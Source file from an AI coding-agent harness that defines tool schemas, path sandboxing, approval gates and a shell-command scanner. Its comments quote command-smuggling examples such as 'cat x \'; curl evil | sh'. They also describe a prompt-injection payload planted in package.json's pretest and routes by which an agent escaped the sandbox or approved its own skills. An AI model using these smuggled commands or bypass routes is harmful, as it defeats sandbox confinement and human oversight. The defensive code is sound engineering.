/**
 * gnomon-core: Tool execution
 *
 * The declared tools in .gnomon/tools.toml, made real: schemas for the model,
 * an executor, a sandbox, and an approval gate.
 *
 * Outcome codes follow conformance/exit_codes.json, so a tool result maps to a
 * bucket the same way a process exit code does:
 *   0      result              — the tool ran
 *   2/3/4  refusal             — denied, out of sandbox, or not declared
 *   11     apparatus_failure   — the tool broke
 *
 * No dependencies.
 */

import { spawn, spawnSync } from "node:child_process";
import { safeGit, containerStarted, containerGone, dockerContainerGone, CONTAINER_ROOT_LABEL } from "./git_safe.js";
import { recordDegradation, type DegradationSink } from "./degradation.js";
import {
  readFileSync,
  writeFileSync,
  existsSync,
  statSync,
  readdirSync,
  realpathSync,
  Dirent,
  Stats,
  mkdirSync,
  rmSync,
  lstatSync,
  readlinkSync
} from "node:fs";
import { resolve, relative, isAbsolute, dirname, basename, join, sep, win32 as win32Path } from "node:path";
import { createHash } from "node:crypto";
import { lookup as dnsLookupCb } from "node:dns";
import { homedir } from "node:os";
import { promisify } from "node:util";
import {
  GnomonConfig,
  declaredTools,
  isToolEnabled,
  recomputeManifest,
  toolMaxLines,
  isValidImageRef,
} from "./config.js";
import { proposeSkill, ProposalRefused, renderSkill, SkillProposal } from "./skills.js";
import { compute, ComputeError } from "./compute.js";
import type { McpRegistry, McpToolInfo } from "./mcp.js";
import {
  COMPAT_EDIT_PARAMETERS,
  fuzzyEdit,
  resolveEditVariant,
  type EditMatchTier,
  type EditVariant,
} from "./sweep_knobs.js";
import {
  bashNetworkEgress,
  describeInvocation,
  gitExecConfigs,
  isDryRunSegment,
  joinWords,
  programName,
  readShellCommand,
  repoCodeRuns,
  shellSpellings,
  shellWriteTargets,
  type GitClean,
  type RepoCodeRun,
  type WriteTarget,
} from "./shell.js";
import { containedReadonlyPaths, ensureDirIn, RootWriteError, writeFileIn } from "./root_fs.js";

// ---------------------------------------------------------------------------
// Outcome codes
// ---------------------------------------------------------------------------

/**
 * The abort reason `gnomon task --deadline` stops a turn with. A turn, or a
 * command, aborted with it ended at the deadline, not at an operator's Esc.
 */
export const DEADLINE_ABORT = "gnomon:deadline";

export const TOOL_OK = 0;
/** The tool ran and the answer was negative (missing path). Still a result. */
export const TOOL_OK_EMPTY = 1;
export const TOOL_DENIED = 2;
export const TOOL_OUT_OF_SANDBOX = 3;
export const TOOL_NOT_DECLARED = 4;
export const TOOL_FAILED = 11;

export interface ToolOutcome {
  /** Maps to a bucket via conformance/exit_codes.json */
  code: number;
  /** What goes back to the model as the tool message */
  content: string;
  /** One line for the transcript */
  summary: string;
  /**
   * Set when `.gnomon/` moved while this call ran. Only `bash` can do this —
   * `write` and `edit` refuse the surface outright — and it is reported rather
   * than prevented because the command is arbitrary shell. `skill` reports it
   * too, as a backstop: a proposal is not hashed, so a hash that moved means a
   * route its own checks did not name (LN8).
   */
  surface_drift?: SurfaceDrift;
  /**
   * Set when the worktree moved while this call ran. Only `bash` reports it,
   * and only observationally — the tree is stamped before and after, never
   * inferred from the command text.
   *
   * Deliberately NOT folded into `touchedFiles`/`verify.after`. Those are a
   * published enumeration (`"write" | "always"`), and since bash is enabled by
   * default, treating shell mutation as a write would collapse `"write"` into
   * `"always"` for any turn that ever shelled out — widening a declared value
   * without declaring it. This exists so the anti-flailing nudge can tell work
   * from idling; the verify gate keeps its own, narrower meaning.
   *
   * Three-valued for a command that ran: true, false, or null when the tree
   * could not be stamped on one side and nobody can say (worktreeMoved).
   * Undefined means no stamp was taken -- another tool, or a bash call refused
   * before it ran. Read `=== false` for "changed nothing", never `!value`:
   * null is falsy and is not an answer.
   */
  worktree_changed?: boolean | null;
  /**
   * The COMMAND's exit status, when the tool ran one.
   *
   * `code` answers "did the tool work" and is `TOOL_OK` for a command that ran
   * and exited 1 — which is correct, and is why a caller that wants to know
   * whether the WORK succeeded cannot read `code` alone. Undefined for every
   * tool that runs no command, and for a kill by signal, where there is no
   * status to report and guessing one would be worse than saying nothing.
   *
   * Structured rather than scraped from `summary`: the verify gate already
   * learned what a regex over that string costs when `exit null` parsed as a
   * clean zero.
   */
  shell_exit?: number;
  /**
   * How an `edit` under `variant = "compat"` found its text (sweep_knobs.ts):
   * `exact`, `whitespace` or `indentation`. Absent for every other edit.
   */
  edit_tier?: EditMatchTier;
  /**
   * Hosts a bash command reached under `network = false` because `[sandbox]
   * allow_package_index` lists them (shell.ts bashNetworkEgress). Absent when
   * the allowlist admitted nothing, which is every call of a surface without it.
   */
  package_index?: string[];
}

// ---------------------------------------------------------------------------
// Schemas
// ---------------------------------------------------------------------------

export interface ToolSchema {
  type: "function";
  function: {
    name: string;
    description: string;
    parameters: Record<string, unknown>;
  };
}

const obj = (
  props: Record<string, unknown>,
  required: string[]
): Record<string, unknown> => ({ type: "object", properties: props, required });

const str = (description: string) => ({ type: "string", description });

/** Parameter schemas for the tools this build implements. */
const IMPLEMENTED: Record<string, Record<string, unknown>> = {
  read: obj(
    {
      path: str("File or directory path, relative to the repository root"),
    },
    ["path"]
  ),
  bash: obj({ command: str("Shell command to run") }, ["command"]),
  task: obj(
    {
      role: str(
        "Role the sub-turn runs as. It gets that role's tools, not yours."
      ),
      instruction: str(
        "Everything the sub-turn needs. It starts with no history and cannot " +
          "see this conversation."
      ),
    },
    ["role", "instruction"]
  ),
  webfetch: obj(
    {
      url: str("Absolute http or https URL to retrieve as text"),
    },
    ["url"]
  ),
  note: obj(
    {
      text: str(
        "One short fact this run learned — what you tried, what failed, what " +
          "not to repeat. Later steps see it, including after compaction."
      ),
    },
    ["text"]
  ),
  todo: {
    type: "object",
    properties: {
      todos: {
        type: "array",
        description:
          "The complete checklist, replacing the previous one. Send every " +
          "item each time, not just the changed ones.",
        items: {
          type: "object",
          properties: {
            content: str("What the step is, in a few words"),
            status: {
              type: "string",
              enum: ["pending", "in_progress", "completed"],
              description: "At most one item may be in_progress.",
            },
          },
          required: ["content", "status"],
        },
      },
    },
    required: ["todos"],
    additionalProperties: false,
  },
  compute: obj(
    {
      expression: str(
        "Arithmetic to evaluate exactly, e.g. `19.99 * 3` or " +
          "`round(1234 / 7, 2)`. Operators + - * / % ^ and the functions " +
          "sqrt, abs, round, floor, ceil, min, max."
      ),
    },
    ["expression"]
  ),
  glob: obj(
    {
      pattern: str(
        "Glob over the path, e.g. `**/*.ts`, `src/**/test_*.py`. `*` stops " +
          "at a separator, `**` crosses them."
      ),
      path: str(
        "File or directory to search, relative to the root. Default: the root."
      ),
    },
    ["pattern"]
  ),
  grep: obj(
    {
      pattern: str("Regular expression to match against each line"),
      path: str("Directory to search under, relative to the root. Default: the root."),
      include: str("Only search files whose path matches this glob, e.g. `**/*.rs`"),
      ignore_case: {
        type: "boolean",
        description: "Match case-insensitively. Default: false.",
      },
    },
    ["pattern"]
  ),
  write: obj(
    {
      path: str("File path, relative to the repository root"),
      content: str("Full file contents to write"),
    },
    ["path", "content"]
  ),
  edit: obj(
    {
      path: str("File path, relative to the repository root"),
      old_text: str("Exact text to replace. Must appear exactly once."),
      new_text: str("Replacement text"),
    },
    ["path", "old_text", "new_text"]
  ),
  skill: obj(
    {
      name: str("Short name for the skill, e.g. 'rust test layout'"),
      body: str(
        "The instruction itself: what someone working in this repository " +
          "should know or do. Concrete and specific to this repository."
      ),
      description: str("One line summarising when this applies"),
      match: str(
        "Optional case-insensitive regular expression. The skill is loaded " +
          "only for turns whose input matches. Omit to always apply."
      ),
      roles: {
        type: "array",
        items: { type: "string" },
        description: "Roles this applies to. Omit for all roles.",
      },
    },
    ["name", "body"]
  ),
};

/**
 * `read`'s schema under a declared window (`max_lines`, CX3): the same `path`,
 * plus `offset` and `limit`. Without a window it is IMPLEMENTED.read itself,
 * the same object, so a surface that declares nothing offers the model the
 * same bytes as before.
 */
export function readParameters(window?: number): Record<string, unknown> {
  if (!window) return IMPLEMENTED.read;
  const base = IMPLEMENTED.read as { properties: Record<string, unknown>; required: string[] };
  return obj(
    {
      ...base.properties,
      offset: { type: "integer", description: "Line number to start at, 1-based. Default: 1." },
      limit: { type: "integer", description: `Lines to return, at most ${window} (the default).` },
    },
    base.required
  );
}

/**
 * A built-in tool's parameter schema as offered under this read window and
 * edit variant, or undefined for a name this build does not implement. The
 * default variant is IMPLEMENTED.edit itself, the same object, so a surface
 * that declares none offers the same bytes as before.
 */
function parametersFor(name: string, readWindow?: number, editVariant?: EditVariant): Record<string, unknown> | undefined {
  if (!Object.prototype.hasOwnProperty.call(IMPLEMENTED, name)) return undefined;
  if (name === "edit" && editVariant === "compat") return COMPAT_EDIT_PARAMETERS;
  return name === "read" ? readParameters(readWindow) : IMPLEMENTED[name];
}

export interface ToolSet {
  schemas: ToolSchema[];
  /**
   * MCP servers the surface declares.
   *
   * The names of MCP servers the surface declares (wired by connectMcp /
   * ctx.mcp). Their discovered tools are merged into `schemas` when connected;
   * this list is what the startup summary counts, and what names a server whose
   * tools are absent because it did not connect — never silently dropped.
   */
  mcp_declared: string[];
  /** Declared but switched off in the surface */
  disabled: string[];
  /** Declared and enabled, but not implemented by this build */
  unimplemented: string[];
  /** Enabled, but not in this role's allow-list */
  withheld: string[];
}

/**
 * Build the tool schemas sent to the model.
 *
 * A declared tool that cannot be offered is named in `disabled` or
 * `unimplemented` rather than quietly left out: system.md forbids silently
 * shortening the tool list.
 */
export function buildToolSet(
  config: GnomonConfig,
  role?: string,
  mcpTools: McpToolInfo[] = []
): ToolSet {
  const schemas: ToolSchema[] = [];
  const disabled: string[] = [];
  const unimplemented: string[] = [];
  const withheld: string[] = [];

  // A role may narrow the tool list. Absent means "everything declared";
  // an empty list means none, which is how a verifier that runs the suite
  // but must not write is expressed.
  const allowed = role ? config.roles[role]?.tools : undefined;
  const roleLimited = Array.isArray(allowed);
  const readWindow = toolMaxLines(config, "read");
  const editVariant = resolveEditVariant(config);

  for (const tool of declaredTools(config)) {
    if (roleLimited && !allowed!.includes(tool.name)) {
      withheld.push(tool.name);
      continue;
    }
    if (!isToolEnabled(config, tool.name)) {
      disabled.push(tool.name);
      continue;
    }
    const parameters = parametersFor(tool.name, readWindow, editVariant);
    if (!parameters) {
      unimplemented.push(tool.name);
      continue;
    }
    schemas.push({
      type: "function",
      function: {
        name: tool.name,
        description: tool.description ?? tool.name,
        parameters,
      },
    });
  }

  // MCP tools discovered from connected servers. Gated like any other tool: a
  // role with a `tools` list must name the tool, or its server (`mcp__<server>`)
  // to take all of that server's tools.
  //
  // Sorted, byte-wise, like the declared tools above (GV17). They arrive in
  // connection order, which is `[mcp_servers.*]` declaration order -- a TOML
  // table, unordered by the TOML spec -- and within a server in whatever order
  // its `tools/list` answered, which is the server's business and can change
  // between its versions or machines. Either one moved the tools JSON, so the
  // same surface sent different prompt bytes and missed the provider's cache.
  const mcpSorted = [...mcpTools].sort((a, b) => (a.name < b.name ? -1 : a.name > b.name ? 1 : 0));
  for (const mt of mcpSorted) {
    const serverKey = `mcp__${mt.server}`;
    if (roleLimited && !allowed!.includes(mt.name) && !allowed!.includes(serverKey)) {
      withheld.push(mt.name);
      continue;
    }
    schemas.push({
      type: "function",
      function: {
        name: mt.name,
        description: mt.description ?? mt.name,
        parameters: mt.inputSchema as Record<string, unknown>,
      },
    });
  }

  const mcp = (config.tools.mcp_servers ?? {}) as Record<string, unknown>;
  return {
    schemas,
    disabled,
    unimplemented,
    withheld,
    mcp_declared: Object.keys(mcp),
  };
}

// ---------------------------------------------------------------------------
// Sandbox
// ---------------------------------------------------------------------------

export type SandboxLevel = "off" | "confined" | "strict";

/**
 * Resolve a model-supplied path inside the repository root.
 *
 * Returns null when the path escapes the root under confined/strict. The check
 * is on the *resolved* path, so `../` and absolute paths are both caught.
 */
export function resolveInRoot(
  root: string,
  path: string,
  sandbox: SandboxLevel,
  extraRoots: string[] = []
): string | null {
  const abs = isAbsolute(path) ? resolve(path) : resolve(root, path);
  if (sandbox === "off") return abs;

  // Compare real paths, not written ones. `resolve()` is pure string algebra:
  // it collapses `..` and nothing else, so a symlink inside the repository
  // pointing anywhere on the filesystem passed this check untouched. That was
  // a full escape in both directions — `read link-to-outside.txt` returned a
  // file the repository does not contain, and `write linked-dir/f` created one
  // outside the root while sandbox was set to "confined".
  //
  // The root is realpath'd too, so a checkout reached through a symlinked
  // parent (a home directory on another volume, a /tmp that is really
  // /private/tmp) still resolves to itself rather than looking like an escape.
  const realAbs = realpathOfNearest(abs);
  // Every granted root is checked the same way the repository root is: real
  // paths, so a symlink cannot smuggle a path into a granted root any more
  // than it can into this one.
  for (const candidate of [root, ...extraRoots]) {
    const realRoot = realpathOrSelf(resolve(candidate));
    const rel = relative(realRoot, realAbs);
    if (!rel.startsWith("..") && !isAbsolute(rel)) return abs;
  }
  return null;
}

/**
 * The OS's own realpath on Windows. The JS implementation walks components
 * lexically and neither expands 8.3 short names nor canonicalises case, so
 * `GNOMON~1\roles.toml` and `.GNOMON\roles.toml` could both be judged
 * outside the surface they are inside. POSIX keeps the JS one it always used.
 */
const realpath: (p: string) => string =
  process.platform === "win32" ? (p) => realpathSync.native(p) : (p) => realpathSync(p);

/** realpath, falling back to the path itself when it does not exist yet. */
function realpathOrSelf(p: string): string {
  try {
    return realpath(p);
  } catch {
    return p;
  }
}

/**
 * Real path of `abs`, resolving whatever part of it already exists.
 *
 * A write names a file that is usually absent, so `realpathSync` on it throws
 * and would leave the check with nothing to compare. Walking up to the
 * nearest existing ancestor and re-attaching the remainder resolves every
 * symlink on the path that could redirect the write, which is the part that
 * matters — the final component cannot itself be a symlink if it does not
 * exist.
 */
function realpathOfNearest(abs: string): string {
  const parts: string[] = [];
  let cur = abs;
  for (let i = 0; i < 64; i++) {
    // A DANGLING symlink makes realpathSync throw, and the fallback below then
    // returns the lexical path — so `src/link.txt -> ../../escaped.txt` looked
    // like it lived in src/ to every guard built on this, write_allow included.
    // Resolve the link by hand before giving up on it: a link that does not
    // point anywhere yet still decides where the write lands.
    try {
      if (lstatSync(cur).isSymbolicLink()) {
        const target = resolve(dirname(cur), readlinkSync(cur));
        // Guard the recursion the same way the loop is guarded.
        const resolved = i < 32 ? realpathOfNearest(target) : target;
        return parts.length > 0 ? join(resolved, ...parts) : resolved;
      }
    } catch {
      /* not a link, or unreadable — fall through to the ordinary path */
    }
    try {
      return parts.length > 0 ? join(realpath(cur), ...parts) : realpath(cur);
    } catch {
      const parent = dirname(cur);
      if (parent === cur) return abs; // reached the filesystem root
      parts.unshift(cur.slice(parent.length + 1));
      cur = parent;
    }
  }
  return abs;
}

// ---------------------------------------------------------------------------
// Approval
// ---------------------------------------------------------------------------

export type ApprovalGate = "never" | "on_write" | "always";

/** A pending tool call awaiting the user's decision. */
export interface ApprovalRequest {
  tool: string;
  /** One-line description, e.g. `write src/x.ts (+12 −3)` */
  summary: string;
  /** Multi-line preview: a diff, or the command about to run */
  preview: string[];
  /**
   * Why this call is asked although the gate or a standing approval would have
   * let it run unasked: `[approval] after_refusal` (after_refusal.ts). Set, a
   * standing approval does not answer it; absent, nothing about the request
   * changed.
   */
  escalated?: string;
}

export type Approver = (req: ApprovalRequest) => Promise<boolean>;

/**
 * Whether the agent may edit its own `.gnomon/` surface this session, set by
 * the human via `/allow`. `strict` (default) keeps the surface a human-only
 * act — the pillar. `custom` lets the agent write it but each edit is approved;
 * `all` is standing consent. A consented surface write still moves the hash
 * loudly, so the change stays auditable. Never set by the agent itself.
 */
export type SurfaceConsent = "strict" | "custom" | "all";

/** Tools that can change something outside the model's own context. */
/**
 * Tools whose call is gated under `approval.gate = "on_write"`.
 *
 * Exported because `/explain approval` used to carry its own literal copy —
 * ["bash","write","edit","skill"] — which omitted `webfetch` and `task`, so the
 * command that exists to tell an operator what is gated named two gated tools
 * as ungated. One list, one truth.
 */
export const MUTATING = new Set(["bash", "write", "edit", "skill", "webfetch", "task"]);

/**
 * Tools that may run CONCURRENTLY with each other.
 *
 * Deliberately narrower than "not MUTATING". A tool qualifies only if running
 * two of them at once cannot change the result of either: no filesystem writes,
 * no process spawning, no network, no shared harness state. `todo` and `note`
 * are excluded despite being harmless to the repository, because they mutate
 * session state and two concurrent writers would race for last-write-wins.
 * `mcp__*` is excluded because this harness cannot know what a foreign server
 * does.
 *
 * Recon is where a turn's calls actually bunch -- reading five files to decide
 * what to change -- so this is where the wall-clock is, and it is exactly the
 * set that is safe.
 *
 * Determinism is preserved by assembling results in DECLARED order regardless
 * of completion order, so a surface still produces the same transcript.
 */
export const CONCURRENT_SAFE = new Set(["read", "glob", "grep", "compute"]);

/** Whether a batch of calls may be executed together. */
export function concurrentSafe(name: string): boolean {
  return CONCURRENT_SAFE.has(name);
}

/** Whether a call needs sign-off under the configured gate. */
/**
 * Whether a call needs sign-off under the configured gate.
 *
 * The three gates are the three ways to run the loop:
 *
 *   always   — every tool call asks, reads and searches included. Consent
 *              after every action.
 *   on_write — only calls that can change something ask. Consent per change.
 *   never    — nothing asks. Unattended.
 *
 * Every tool must consult this, not only the mutating ones. `always` used to
 * be reached exclusively from `bash`, `write`, `edit` and `skill`, which are
 * the same four `on_write` stops — so the two settings behaved identically and
 * `always` was a documented dial that turned nothing. policy.toml already says
 * what that is worth: a surface documenting a setting no code reads is worse
 * than one that omits it, because it invites you to tune something that
 * cannot move.
 */
export function needsApproval(tool: string, gate: ApprovalGate): boolean {
  if (gate === "always") return true;
  if (gate === "never") return false;
  // on_write: bash is included because a command can write anything.
  return MUTATING.has(tool);
}

/**
 * `[approval] repo_code = true`: a bash call that runs repository-defined code
 * -- package.json scripts through `npm test`, `npm install`'s lifecycle
 * scripts, a Makefile, `pip install -e .` (shell.ts, repoCodeRuns) -- asks a
 * person first, whatever `gate` says. Off unless declared.
 *
 * Why it exists, and why it is opt-in: INJ-2026-11 planted its payload as
 * package.json's `pretest`, and `npm test` ran it on every surface without a
 * container (0 of 40 blocked). The call names `npm test`; what runs is in the
 * repository. No rule over the command line can judge that code, so this one
 * does not try: it makes the call visible and puts it to a person. Asking on
 * every `npm test` is a cost an unattended surface would not choose by
 * default. Only a sandbox (`exec = "docker"`) contains what the script does.
 */
export function repoCodeAsks(ctx: ToolContext): boolean {
  return (ctx.config?.policy as { approval?: { repo_code?: unknown } } | undefined)?.approval?.repo_code === true;
}

/**
 * What the person asked about a call is told about the repository code it
 * runs: the runner and what it runs, and for the npm family the scripts from
 * package.json at the root that would run, as the file spells them.
 */
export function repoCodeNote(runs: RepoCodeRun[], root: string): string[] {
  if (runs.length === 0) return [];
  let scripts: Record<string, unknown> = {};
  if (runs.some((r) => r.scripts)) {
    try {
      const pkg = JSON.parse(readFileSync(join(root, "package.json"), "utf-8")) as { scripts?: Record<string, unknown> };
      scripts = pkg.scripts && typeof pkg.scripts === "object" ? pkg.scripts : {};
    } catch {
      scripts = {};
    }
  }
  const lines: string[] = [];
  for (const r of runs) {
    lines.push(`runs repository-defined code: ${r.what} (${r.command.slice(0, 120)})`);
    for (const name of r.scripts ?? []) {
      const body = scripts[name];
      if (typeof body === "string") lines.push(`  ${name}: ${body.replace(/\s+/g, " ").slice(0, 160)}`);
    }
  }
  return lines;
}

/**
 * Ask for a read-only call, when the gate is strict enough to want one.
 *
 * Returns null when the call may proceed, or the refusal to hand back. Reads
 * and searches share this because under `always` the reason to stop is the
 * same for all of them, and it is not that they might change something.
 */
async function gateReadOnly(
  tool: string,
  summary: string,
  ctx: ToolContext,
  preview: string[] = []
): Promise<ToolOutcome | null> {
  if (!needsApproval(tool, ctx.gate)) return null;
  const ok = await ctx.approve({ tool, summary, preview });
  if (ok) return null;
  return {
    code: TOOL_DENIED,
    content: `Refused: the user declined the ${tool} call.`,
    summary: `${summary} — denied`,
  };
}

// ---------------------------------------------------------------------------
// Shell command inspection
// ---------------------------------------------------------------------------

/** What a shell command is made of, as far as an allow-list must care. */
export interface ShellScan {
  /** Top-level commands, split on unquoted `;` `&&` `||` `|` `&` and newline */
  segments: string[];
  /** `$(...)`, backticks, or process substitution appears outside quotes */
  substitution: boolean;
  /** Output redirection appears outside quotes */
  redirection: boolean;
}

/**
 * Take a shell command apart, honouring quotes.
 *
 * An allow-list that tests the whole string is not an allow-list. Matching
 * `^ls\s` against `ls /tmp; echo pwned > f` succeeds, and the shell then runs
 * both halves — which is exactly how a role with no write tool wrote a file.
 * Every top-level segment has to clear the list on its own, and a `;` inside
 * `grep "a;b"` must not be mistaken for one.
 */
export function scanShellCommand(command: string): ShellScan {
  const segments: string[] = [];
  let current = "";
  let quote: '"' | "'" | null = null;
  let substitution = false;
  let redirection = false;

  const push = () => {
    const t = current.trim();
    if (t) segments.push(t);
    current = "";
  };

  for (let i = 0; i < command.length; i++) {
    const ch = command[i];
    const next = command[i + 1];

    if (quote) {
      // Single quotes take everything literally; double quotes still expand,
      // so a substitution inside them is real.
      if (quote === '"' && ((ch === "$" && next === "(") || ch === "`")) {
        substitution = true;
      }
      // A single-quoted string ends at the very next quote — bash never lets
      // a backslash escape it; only inside double quotes does `\"` stay
      // literal. Applying the backslash test to single quotes let `'x\'` read
      // as an open quote, swallowing the `; curl … | sh` tail into one segment
      // that an allow-listed prefix then waved through.
      if (ch === quote && (quote === "'" || command[i - 1] !== "\\")) quote = null;
      current += ch;
      continue;
    }

    // Outside any quote, a backslash escapes the next character — bash reads
    // `\'`, `\"`, `\;`, `\|`, `\>`, `\$` as the literal character. Consume both
    // here so the escaped char can neither open a quote nor be mistaken for a
    // separator. Without this, `cat x \'; curl evil | sh` had its `\'` open a
    // quote bash never opened, swallowing the whole `; curl … | sh` tail into
    // one segment that an allow-listed `^cat` prefix then waved through — the
    // per-role bash confinement, defeated by two characters.
    if (ch === "\\") {
      current += ch + (next ?? "");
      i++;
      continue;
    }

    if (ch === '"' || ch === "'") {
      quote = ch;
      current += ch;
      continue;
    }

    if (ch === "`" || (ch === "$" && next === "(")) {
      substitution = true;
      current += ch;
      continue;
    }
    // Process substitution: <(cmd) and >(cmd) both run a command.
    if ((ch === "<" || ch === ">") && next === "(") {
      substitution = true;
      current += ch;
      continue;
    }
    if (ch === ">") {
      redirection = true;
      current += ch;
      continue;
    }

    if (ch === ";" || ch === "\n") {
      push();
      continue;
    }
    if ((ch === "&" || ch === "|") && next === ch) {
      push();
      i++;
      continue;
    }
    if (ch === "|" || ch === "&") {
      push();
      continue;
    }

    current += ch;
  }
  push();

  return { segments, substitution, redirection };
}

// ---------------------------------------------------------------------------
// Diff preview
// ---------------------------------------------------------------------------

/**
 * Largest LCS table this will allocate: ~2M cells, about 16MB as a dense
 * number[][], which is a size a long-running session can absorb repeatedly.
 * Roughly 1400x1400 lines.
 */
export const LCS_CELL_CAP = 2_000_000;

/** Marks a diff whose preview was skipped; carries the real counts for diffStat. */
export const DIFF_ELIDED = "  … diff preview elided:";

/**
 * What changed, for a pair too large to diff cell-by-cell.
 *
 * Deliberately honest about being a summary: a reviewer who is shown "+3 −1"
 * for a 40 000-line rewrite has been misled, so this says outright that the
 * preview was elided and how big the two sides are.
 */
function summariseDiff(a: string[], b: string[]): string[] {
  const sample = 12;
  // The counts ride in the marker so diffStat stays truthful. Without this the
  // sampled lines are all it can see, and a 40 000-line rewrite reports "+12
  // −12" — a reviewer shown that has been actively misled, which is worse than
  // being told the preview was skipped.
  const out: string[] = [
    `${DIFF_ELIDED} ${a.length} lines → ${b.length} lines is too large to diff ` +
      `line-by-line; showing the first ${sample} of each side. removed=${a.length} added=${b.length}`,
  ];
  for (const line of a.slice(0, sample)) out.push(`- ${line}`);
  if (a.length > sample) out.push(`  … ${a.length - sample} more removed`);
  for (const line of b.slice(0, sample)) out.push(`+ ${line}`);
  if (b.length > sample) out.push(`  … ${b.length - sample} more added`);
  return out;
}

/** Longest-common-subsequence line diff, rendered as +/- lines. */
export function diffLines(before: string, after: string, context = 3): string[] {
  const a = before.length ? before.split("\n") : [];
  const b = after.length ? after.split("\n") : [];

  // "Files here are small enough that O(n·m) is fine" was the standing comment,
  // and it is true right up until a model overwrites a lockfile, a generated
  // file or a dataset. Measured: 6 000 lines cost 371MB, 12 000 cost 866MB, and
  // 40 000 killed the process outright with a V8 heap OOM -- exit 134, SIGABRT.
  //
  // That is the worst failure this harness can have. The try/catch in
  // executeTool cannot catch a V8 OOM, so nothing is emitted: no exit-contract
  // code, no session snapshot, no session_end record. Rule 5 promises a
  // published exit contract and an ordinary `write` walked straight past it,
  // taking the audit trail's seal with it.
  //
  // Above the cap, say what changed instead of computing where. The approval
  // preview truncates at 60 lines regardless, so no caller loses anything it
  // was actually going to show.
  if ((a.length + 1) * (b.length + 1) > LCS_CELL_CAP) {
    return summariseDiff(a, b);
  }
  const lcs: number[][] = Array.from({ length: a.length + 1 }, () =>
    new Array(b.length + 1).fill(0)
  );
  for (let i = a.length - 1; i >= 0; i--) {
    for (let j = b.length - 1; j >= 0; j--) {
      lcs[i][j] =
        a[i] === b[j] ? lcs[i + 1][j + 1] + 1 : Math.max(lcs[i + 1][j], lcs[i][j + 1]);
    }
  }

  const marked: Array<{ sign: " " | "+" | "-"; text: string }> = [];
  let i = 0;
  let j = 0;
  while (i < a.length && j < b.length) {
    if (a[i] === b[j]) {
      marked.push({ sign: " ", text: a[i] });
      i++;
      j++;
    } else if (lcs[i + 1][j] >= lcs[i][j + 1]) {
      marked.push({ sign: "-", text: a[i++] });
    } else {
      marked.push({ sign: "+", text: b[j++] });
    }
  }
  while (i < a.length) marked.push({ sign: "-", text: a[i++] });
  while (j < b.length) marked.push({ sign: "+", text: b[j++] });

  // Keep only `context` unchanged lines around each change.
  const keep = new Array(marked.length).fill(false);
  marked.forEach((m, k) => {
    if (m.sign === " ") return;
    for (let x = Math.max(0, k - context); x <= Math.min(marked.length - 1, k + context); x++) {
      keep[x] = true;
    }
  });

  const out: string[] = [];
  let skipping = false;
  marked.forEach((m, k) => {
    if (keep[k]) {
      out.push(`${m.sign} ${m.text}`);
      skipping = false;
    } else if (!skipping) {
      out.push("  …");
      skipping = true;
    }
  });
  return out;
}

/** `+n −m` counts for a diff. */
export function diffStat(lines: string[]): { added: number; removed: number } {
  // An elided preview carries the true totals, because the handful of sampled
  // lines it shows are not what changed.
  const elided = lines[0]?.startsWith(DIFF_ELIDED)
    ? /removed=(\d+) added=(\d+)/.exec(lines[0])
    : null;
  if (elided) {
    return { added: Number(elided[2]), removed: Number(elided[1]) };
  }
  return {
    added: lines.filter((l) => l.startsWith("+ ")).length,
    removed: lines.filter((l) => l.startsWith("- ")).length,
  };
}

// ---------------------------------------------------------------------------
// Execution
// ---------------------------------------------------------------------------

/**
 * Set in the environment of every subprocess a tool starts: the bash tool's
 * shell and every MCP server. Its value names the session.
 *
 * It marks "the agent is running this". `gnomon skill accept` and `reject`
 * refuse when they see it, because acceptance is a person's act -- before
 * this, the agent's own bash could run `gnomon skill accept` and the record
 * said `by: "human"`. A process can drop the variable from its own
 * environment (`env -u`), so the refusal also reads it from the ancestors'
 * starting environments and looks for gnomon among them (agent_context.ts).
 * It is a refusal with reasons, not a proof; the records say `by: "cli"`,
 * never claiming a person they cannot see.
 */
export const AGENT_SESSION_ENV = "GNOMON_AGENT_SESSION";

/** The environment for a tool's subprocess: the parent's, plus the marker. */
export function agentEnv(session: string | undefined, base: NodeJS.ProcessEnv = process.env): NodeJS.ProcessEnv {
  return { ...base, [AGENT_SESSION_ENV]: session || `pid-${process.pid}` };
}

export interface ToolContext {
  /** Needed by `skill`, which writes inside .gnomon/ */
  config?: GnomonConfig;
  /** The session the tool runs in; exported to subprocesses as GNOMON_AGENT_SESSION. */
  agentSession?: string;
  /**
   * Shell commands the current role may run. Empty/undefined means any.
   * See RoleDef.bash_allow: without this, granting `bash` grants writing.
   */
  bashAllow?: string[];
  /**
   * Shell commands the current role may never run, whatever else allows them.
   *
   * See RoleDef.bash_deny. This is the list for the handful of operations
   * whose damage is not local and not undoable by re-running something —
   * force-pushing a release branch, deleting it on the remote. The role doing
   * the work has unrestricted bash by necessity; this is how it still cannot
   * do those.
   */
  bashDeny?: string[];
  /**
   * Paths this role may create or modify, as globs. Empty/undefined means any
   * path inside the sandbox.
   *
   * See RoleDef.write_allow. The `tools` list decides *whether* a role can
   * write; this decides *where*. A coordinator described as writing specs and
   * never source needs this, because withholding `edit` only stops it from
   * revising a file in place — `write` will happily create src/main.rs.
   */
  writeAllow?: string[];
  root: string;
  sandbox: SandboxLevel;
  /**
   * Additional absolute roots the SURFACE has granted, from
   * `[sandbox] extra_roots`. A path landing inside one of these is treated
   * exactly as if it were inside the repository root.
   *
   * This exists so that "let the agent read my other repository" does not have
   * to be spelled `sandbox = "off"`. Before it, an operator with a neighbouring
   * checkout to consult had two options, and both were worse: turn the sandbox
   * off, losing confinement everywhere at once, or lean on `bash cat`, which
   * the level does not govern at all. A named root is narrower than either, and
   * it is declared data -- it lives in policy.toml, it is hashed with the rest
   * of the surface, and `gnomon surface hash` moves when it changes. Consent
   * that leaves a trace, rather than a flag that does not.
   */
  extraRoots?: string[];
  /**
   * Below this many files the worktree stamp walks the tree instead of asking
   * git. Undefined means STAMP_WALK_BELOW, which is what every caller in the
   * product uses; tests set 0 to put a small fixture through the git path.
   */
  stampWalkBelow?: number;
  /**
   * Roles the current role may delegate to. Undefined means every role, which
   * is what shipped; see RoleDef.task_allow for why that is worth declaring.
   */
  taskAllow?: string[];
  /**
   * Where `bash` runs. Undefined or mode "off" means the host, which is the
   * default and the behaviour that shipped. See resolveExec.
   */
  exec?: { mode: "off" | "docker"; image: string; network: boolean };
  gate: ApprovalGate;
  approve: Approver;
  /** bash timeout, ms */
  timeoutMs: number;
  /**
   * `gnomon task --deadline`: the epoch milliseconds a bash command must be
   * finished by (the deadline less twice its margin: the turn stops at one
   * margin, and the model gets the other to act on the output). A command's
   * timeout is clamped to the time left before it. Absent without a deadline, which is
   * the behaviour before it existed.
   */
  deadlineAt?: number;
